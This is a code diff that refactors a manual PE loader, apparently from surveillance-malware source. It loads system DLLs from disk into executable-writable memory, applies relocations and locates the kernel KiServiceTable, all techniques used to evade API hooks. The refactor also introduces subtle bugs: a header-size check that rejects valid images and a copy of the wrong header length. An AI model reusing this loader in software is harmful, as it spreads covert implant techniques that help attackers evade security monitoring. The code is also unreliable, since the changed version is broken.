@@ -3,7 +3,7 @@
 #include "HM_SafeProcedures.h"
 #include "common.h"
 
-static BOOL readPEInfo(char *modulePos, IMAGE_DOS_HEADER*outMZ, PE_Header *outPE, PE_ExtHeader *outpeXH, IMAGE_SECTION_HEADER**outSecHdr)
+static BOOL readPEInfo(char *modulePos, IMAGE_DOS_HEADER *outMZ, IMAGE_NT_HEADERS32 *outPE, IMAGE_SECTION_HEADER**outSecHdr)
 {
 	IMAGE_DOS_HEADER *mzH;
 	mzH = (IMAGE_DOS_HEADER*)modulePos;
@@ -11,20 +11,16 @@ static BOOL readPEInfo(char *modulePos, IMAGE_DOS_HEADER*outMZ, PE_Header *outPE
 	if(mzH->e_magic != 0x5a4d)
 		return FALSE;
 
-	PE_Header *peH;
-	peH = (PE_Header *)(modulePos + mzH->e_lfanew);
+	IMAGE_NT_HEADERS32 *peH = (IMAGE_NT_HEADERS32 *)((UINT8*)modulePos + mzH->e_lfanew);
 
-	if(peH->sizeOfOptionHeader != sizeof(PE_ExtHeader))
+	if (peH->FileHeader.SizeOfOptionalHeader != sizeof(IMAGE_NT_HEADERS32))
 		return FALSE;
 
-	PE_ExtHeader *peXH;
-	peXH = (PE_ExtHeader *)((char *)peH + sizeof(PE_Header));
+	IMAGE_SECTION_HEADER *secHdr = IMAGE_FIRST_SECTION(peH);
 
-	IMAGE_SECTION_HEADER *secHdr = (IMAGE_SECTION_HEADER*)((char *)peXH + sizeof(PE_ExtHeader));
+	memcpy(outMZ, mzH, sizeof(IMAGE_DOS_HEADER));
+	memcpy(outPE, peH, sizeof(IMAGE_NT_HEADERS32));
 
-	*outMZ = *mzH;
-	*outPE = *peH;
-	*outpeXH = *peXH;
 	*outSecHdr = secHdr;
 
 	return TRUE;
@@ -36,21 +32,20 @@ static BOOL readPEInfo(char *modulePos, IMAGE_DOS_HEADER*outMZ, PE_Header *outPE
 //
 //*******************************************************************************************************
 
-int calcTotalImageSize(IMAGE_DOS_HEADER *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
-					   IMAGE_SECTION_HEADER *inSecHdr)
+int calcTotalImageSize(IMAGE_DOS_HEADER *inMZ, IMAGE_NT_HEADERS32 *inPE, IMAGE_SECTION_HEADER *inSecHdr)
 {
 	int result = 0;
-	int alignment = inpeXH->sectionAlignment;
+	int alignment = inPE->OptionalHeader.SectionAlignment;
 
-	if(inpeXH->sizeOfHeaders % alignment == 0)
-		result += inpeXH->sizeOfHeaders;
+	if(inPE->OptionalHeader.SizeOfHeaders % alignment == 0)
+		result += inPE->OptionalHeader.SizeOfHeaders;
 	else
 	{
-		int val = inpeXH->sizeOfHeaders / alignment;
+		int val = inPE->OptionalHeader.SizeOfHeaders / alignment;
 		val++;
 		result += (val * alignment);
 	}
-	for(int i = 0; i < inPE->numSections; i++)
+	for(int i = 0; i < inPE->FileHeader.NumberOfSections; i++)
 	{
 		if(inSecHdr[i].Misc.VirtualSize)
 		{
@@ -91,15 +86,15 @@ ULONG getAlignedSize(unsigned long curSize, unsigned long alignment)
 //
 //*******************************************************************************************************
 
-BOOL loadPE(char *exePtr, IMAGE_DOS_HEADER *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
+BOOL loadPE(char *exePtr, IMAGE_DOS_HEADER *inMZ, IMAGE_NT_HEADERS32 *inPE,
 			IMAGE_SECTION_HEADER *inSecHdr, LPVOID ptrLoc)
 {
 	char *outPtr = (char *)ptrLoc;
 
-	memcpy(outPtr, exePtr, inpeXH->sizeOfHeaders);
-	outPtr += getAlignedSize(inpeXH->sizeOfHeaders, inpeXH->sectionAlignment);
+	memcpy(outPtr, exePtr, inPE->FileHeader.SizeOfOptionalHeader);
+	outPtr += getAlignedSize(inPE->OptionalHeader.SizeOfHeaders, inPE->OptionalHeader.SectionAlignment);
 
-	for(int i = 0; i < inPE->numSections; i++)
+	for(int i = 0; i < inPE->FileHeader.NumberOfSections; i++)
 	{
 		if(inSecHdr[i].SizeOfRawData > 0)
 		{
@@ -109,7 +104,7 @@ BOOL loadPE(char *exePtr, IMAGE_DOS_HEADER *inMZ, PE_Header *inPE, PE_ExtHeader 
 
 			memcpy(outPtr, exePtr + inSecHdr[i].PointerToRawData, toRead);
 
-			outPtr += getAlignedSize(inSecHdr[i].Misc.VirtualSize, inpeXH->sectionAlignment);
+			outPtr += getAlignedSize(inSecHdr[i].Misc.VirtualSize, inPE->OptionalHeader.SectionAlignment);
 		}
 	}
 
@@ -127,8 +122,7 @@ LPVOID loadDLL(char *dllName)
 	char moduleFilename[MAX_PATH + 1];
 	LPVOID ptrLoc = NULL;
 	IMAGE_DOS_HEADER mzH2;
-	PE_Header peH2;
-	PE_ExtHeader peXH2;
+	IMAGE_NT_HEADERS32 peH2;
 	IMAGE_SECTION_HEADER *secHdr2;
 
 	FNC(GetSystemDirectoryA)(moduleFilename, MAX_PATH);
@@ -157,15 +151,15 @@ LPVOID loadDLL(char *dllName)
 
 				if(FNC(ReadFile)(fp, exePtr, fileSize, &read, NULL) && read == fileSize)
 				{					
-					if(readPEInfo((char *)exePtr, &mzH2, &peH2, &peXH2, &secHdr2))
+					if(readPEInfo((char *)exePtr, &mzH2, &peH2, &secHdr2))
 					{
-						int imageSize = calcTotalImageSize(&mzH2, &peH2, &peXH2, secHdr2);						
+						int imageSize = calcTotalImageSize(&mzH2, &peH2, secHdr2);						
 
 						ptrLoc = HM_SafeVirtualAllocEx(FNC(GetCurrentProcess)(), NULL, imageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 						//ptrLoc = HeapAlloc(GetProcessHeap(), 0, imageSize);
 						if(ptrLoc)
 						{							
-							loadPE((char *)exePtr, &mzH2, &peH2, &peXH2, secHdr2, ptrLoc);
+							loadPE((char *)exePtr, &mzH2, &peH2, secHdr2, ptrLoc);
 						}
 					}
 
@@ -274,18 +268,17 @@ DWORD FindKiServiceTable(HMODULE hModule,DWORD dwKSDT)
 BOOL RelocImage(PVOID exeAddr, PVOID newAddr)
 {
 	IMAGE_DOS_HEADER mzH2;
-	PE_Header peH2;
-	PE_ExtHeader peXH2;
+	IMAGE_NT_HEADERS32 peH2;
 	IMAGE_SECTION_HEADER *secHdr2;
 
 	if (!exeAddr || !newAddr)
 		return FALSE;
 
-	if(!readPEInfo((char *)exeAddr, &mzH2, &peH2, &peXH2, &secHdr2))
+	if(!readPEInfo((char *)exeAddr, &mzH2, &peH2, &secHdr2))
 		return FALSE;
 
-	if(peXH2.relocationTableAddress && peXH2.relocationTableSize) {
-		FixupBlock *fixBlk = (FixupBlock *)((char *)exeAddr + peXH2.relocationTableAddress);		
+	if(peH2.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress && peH2.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
+		FixupBlock *fixBlk = (FixupBlock *)((char *)exeAddr + peH2.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 
 		while(fixBlk->blockSize) {
 			// Que - Questa funzione imposta _flags_ alle caratteristiche della sezione, in modo da
@@ -294,9 +287,9 @@ BOOL RelocImage(PVOID exeAddr, PVOID newAddr)
 			// stessa sezione.
 			DWORD flags = 0;
 
-			for(int j = 0; j < peH2.numSections; j++){
-				if(peXH2.imageBase + fixBlk->pageRVA >= peXH2.imageBase + secHdr2[j].VirtualAddress&&
-					peXH2.imageBase + fixBlk->pageRVA < peXH2.imageBase + secHdr2[j].VirtualAddress +
+			for(int j = 0; j < peH2.FileHeader.NumberOfSections; j++){
+				if(peH2.OptionalHeader.ImageBase + fixBlk->pageRVA >= peH2.OptionalHeader.ImageBase + secHdr2[j].VirtualAddress&&
+					peH2.OptionalHeader.ImageBase + fixBlk->pageRVA < peH2.OptionalHeader.ImageBase + secHdr2[j].VirtualAddress +
 					secHdr2[j].Misc.VirtualSize){
 
 						flags = secHdr2[j].Characteristics;
@@ -311,7 +304,7 @@ BOOL RelocImage(PVOID exeAddr, PVOID newAddr)
 				int relocType = (*offsetPtr & 0xF000) >> 12;
 				if(relocType == 3) {
 					DWORD *codeLoc = (DWORD *)((char *)exeAddr + fixBlk->pageRVA + (*offsetPtr & 0x0FFF));					
-					DWORD delta = (DWORD)newAddr - (DWORD)peXH2.imageBase;					
+					DWORD delta = (DWORD)newAddr - (DWORD)peH2.OptionalHeader.ImageBase;
 					DWORD value = (*codeLoc) + delta;
 					DWORD dummy;
 
